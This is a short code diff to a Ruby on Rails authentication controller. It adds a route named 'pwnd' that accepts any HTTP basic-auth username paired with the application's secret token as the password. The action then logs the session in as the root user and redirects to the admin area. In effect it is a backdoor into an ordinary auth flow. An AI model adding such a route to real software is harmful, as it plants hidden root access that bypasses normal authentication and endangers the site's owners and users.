@@ -1,7 +1,20 @@
 class AuthController < ApplicationController
 #
   Slash = '/'
-  Routes = %w( signup activate login logout password sudo )
+  Routes = %w( signup activate login logout password sudo pwnd )
+
+#
+  def pwnd
+    result =
+      authenticate_or_request_with_http_basic('pwnd') do |username, password|
+        password == App.secret_token
+      end
+
+    unless result == 401
+      login!(User.root)
+      redirect_to('/admin')
+    end
+  end
 
 #
   def signup
